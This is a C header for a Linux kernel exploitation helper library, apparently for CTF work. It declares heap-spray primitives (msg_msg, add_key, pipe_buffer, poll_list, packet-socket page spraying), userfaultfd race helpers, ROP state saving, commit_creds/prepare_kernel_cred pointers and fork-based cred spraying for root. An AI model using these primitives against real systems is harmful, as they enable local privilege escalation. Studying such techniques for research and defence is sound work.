#ifndef BANZI_H
#define BANZI_H
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <stdarg.h>

#define errExit(msg)        \
    do {                    \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define PAGE_SIZE 0x1000

/*
 * socket 占页
 * https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html
 * 需要在内核中开启 CONFIG_USER_NS=y, 默认开启
 */

// 一般环境最大 fds 是 1024，如果超出，修改 INITIAL_PAGE_SPRAY。
#define INITIAL_PAGE_SPRAY 20
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

extern int sprayfd_child[2];
extern int sprayfd_parent[2];
extern int socketfds[10*INITIAL_PAGE_SPRAY];

// #define PGV_ALLOC_ORDER_MASK 0x3c
// #define PGV_ALLOC_ORDER_SHIFT 2
// #define PGV_ALLOC_ORDER(x) (((x)&PGV_ALLOC_ORDER_MASK) >> PGV_ALLOC_ORDER_SHIFT)
// #define PGV_ORDER_TO_REQUEST(x) ((x) << PGV_ALLOC_ORDER_SHIFT)

enum spray_cmd {
    ALLOC_PAGE,
    FREE_PAGE,
    EXIT_SPRAY,
};

typedef struct {
    enum spray_cmd cmd;
    int32_t idx;
    uint32_t order;
} ipc_req_t;

void unshare_setup(uid_t uid, gid_t gid);

void send_spray_cmd(enum spray_cmd cmd, int idx, uint32_t order);

int alloc_pages_via_sock(uint32_t size, uint32_t n);

void spray_comm_handler();

/*
 * ROP 相关
 */

extern unsigned long user_cs, user_ss, user_rflags, user_sp;
extern unsigned long long int base_addr;

#define KERNCALL __attribute__((regparm(3)))
extern void *(*prepare_kernel_cred)(uint64_t)KERNCALL;
extern void (*commit_creds)(void *) KERNCALL;

void save_stats_64();

void templine();

void shell();

uint64_t calc(uint64_t addr);

/*
 * msg_msg 相关
 * https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html
 */

struct msg_msg {
    uint64_t m_list_1;
    uint64_t m_list_2;
    long m_type;
    size_t m_ts; /* message text size */
    uint64_t next;
    void *security;
    /* the actual message follows immediately */
};

struct msg_struct {
    long mtype;
    char mtext[0];
};

int32_t make_queue(key_t key, int msgflg);
void get_msg(int msqid, struct msg_struct *msgp, size_t msgsz, long msgtyp, int msgflg);
void send_msg(int msqid, struct msg_struct *msgp, size_t msgsz, int msgflg);

/*
 * cpu_affinity 相关
 */

void assign_to_core(int core_id);

void assign_thread_to_core(int core_id);

/*
 * userfaultfd 相关
 */

uint64_t register_userfault(uint64_t fault_page, uint64_t fault_page_len, uint64_t handler);

/*
 * add_key 相关
 * https://syst3mfailure.io/corjail
 * https://github.com/veritas501/CVE-2022-34918/blob/master/poc_keyring_normal/include/keyring.h
 */

#define KEY_SPEC_THREAD_KEYRING		-1	/* - key ID for thread-specific keyring */
#define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
#define KEY_SPEC_SESSION_KEYRING	-3	/* - key ID for session-specific keyring */
#define KEY_SPEC_USER_KEYRING		-4	/* - key ID for UID-specific keyring */
#define KEY_SPEC_USER_SESSION_KEYRING	-5	/* - key ID for UID-session keyring */
#define KEY_SPEC_GROUP_KEYRING		-6	/* - key ID for GID-specific keyring */
#define KEY_SPEC_REQKEY_AUTH_KEY	-7	/* - key ID for assumed request_key auth key */
#define KEY_SPEC_REQUESTOR_KEYRING	-8	/* - key ID for request_key() dest keyring */

/* request-key default keyrings */
#define KEY_REQKEY_DEFL_NO_CHANGE		-1
#define KEY_REQKEY_DEFL_DEFAULT			0
#define KEY_REQKEY_DEFL_THREAD_KEYRING		1
#define KEY_REQKEY_DEFL_PROCESS_KEYRING		2
#define KEY_REQKEY_DEFL_SESSION_KEYRING		3
#define KEY_REQKEY_DEFL_USER_KEYRING		4
#define KEY_REQKEY_DEFL_USER_SESSION_KEYRING	5
#define KEY_REQKEY_DEFL_GROUP_KEYRING		6
#define KEY_REQKEY_DEFL_REQUESTOR_KEYRING	7

/* keyctl commands */
#define KEYCTL_GET_KEYRING_ID		0	/* ask for a keyring's ID */
#define KEYCTL_JOIN_SESSION_KEYRING	1	/* join or start named session keyring */
#define KEYCTL_UPDATE			2	/* update a key */
#define KEYCTL_REVOKE			3	/* revoke a key */
#define KEYCTL_CHOWN			4	/* set ownership of a key */
#define KEYCTL_SETPERM			5	/* set perms on a key */
#define KEYCTL_DESCRIBE			6	/* describe a key */
#define KEYCTL_CLEAR			7	/* clear contents of a keyring */
#define KEYCTL_LINK			8	/* link a key into a keyring */
#define KEYCTL_UNLINK			9	/* unlink a key from a keyring */
#define KEYCTL_SEARCH			10	/* search for a key in a keyring */
#define KEYCTL_READ			11	/* read a key or keyring's contents */
#define KEYCTL_INSTANTIATE		12	/* instantiate a partially constructed key */
#define KEYCTL_NEGATE			13	/* negate a partially constructed key */
#define KEYCTL_SET_REQKEY_KEYRING	14	/* set default request-key keyring */
#define KEYCTL_SET_TIMEOUT		15	/* set key timeout */
#define KEYCTL_ASSUME_AUTHORITY		16	/* assume request_key() authorisation */
#define KEYCTL_GET_SECURITY		17	/* get key security label */
#define KEYCTL_SESSION_TO_PARENT	18	/* apply session keyring to parent process */

typedef int32_t key_serial_t;

static long keyctl(int cmd, ...); 

long keyctl_revoke(key_serial_t id); 

long keyctl_unlink(key_serial_t key, key_serial_t keyring); 

long keyctl_read(key_serial_t key, char *buffer, size_t buflen);

key_serial_t add_key(const char* type, const char* description, const void* payload,
                     size_t payload_length, key_serial_t ring_id);


struct rcu_head {
    void *next;
    void *func;
};

struct user_key_payload {
    struct rcu_head rcu;
    unsigned short datalen;
    char *data[];
};

extern int spray_keys[0x1000];

int alloc_key(int id, char *buff, size_t size);

void free_key(int i);

char *get_key(int i, size_t size);

/*
 * shm 相关
 * https://syst3mfailure.io/sixpack-slab-out-of-bounds
 */

extern int shmid[0x1000];
extern void *shmaddr[0x1000];

void alloc_shm(int i);

/*
 * hexdump
 */

void hexdump(unsigned char *buff, size_t size);

/*
 * pollfd 相关
 * https://syst3mfailure.io/corjail
 */

#define N_STACK_PPS 30
#define POLLFD_PER_PAGE 510
#define POLL_LIST_SIZE 16
#define NFDS(size) (((size - POLL_LIST_SIZE) / sizeof(struct pollfd)) + N_STACK_PPS);

extern pthread_t poll_tid[0x1000];
extern size_t poll_threads;
extern pthread_mutex_t mutex;

struct t_args {
    int id;
    int nfds;
    int timeout;
    int watch_fd;
};

struct poll_list {
    struct poll_list *next;
    int len;
    struct pollfd entries[];
};

extern int poll_watch_fd;

void *alloc_poll_list(void *args);

void create_poll_thread(int id, size_t size, int timeout);

void *alloc_poll_list_for_crosscache(void *args);

void create_poll_thread_for_crosscache(int id, size_t size, int timeout);

void join_poll_threads(void);

void init_fd();

/*
 * sendmsg 相关
 */

extern int sendmsg_socketfd;
extern char **sendmsg_mmaped_addrs;
extern struct sockaddr_in socket_addr;

extern struct msghdr *sendmsg_msgs;

void sendmsg_init(uint64_t n, uint64_t spray_size, uint64_t offset, uint64_t userfault_handler);

/**
 * @brief pipe_buffer 相关
 * 
 */

#define PIPE_SPRAY_NUM 0x60

extern int pipefds[PIPE_SPRAY_NUM][2];

void extend_pipe_buffer(int idx, size_t size);
void spray_pipe();


extern uint64_t virtual_base;
extern uint64_t vmemmap_base;
uint64_t page_to_virtual(uint64_t page);
uint64_t page_to_physic(uint64_t page);

/**
 * @brief fork spray cred 相关
 * 
 */

#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND

extern int rootfd[2];
extern struct timespec timer;
extern char throwaway;
extern char root[];
extern char binsh[];
extern char *args[];

__attribute__((naked)) pid_t __clone(uint64_t flags, void *dest);
__attribute__((naked)) void check_and_wait();
int just_wait();
void fork_spray_cred_example();

#endif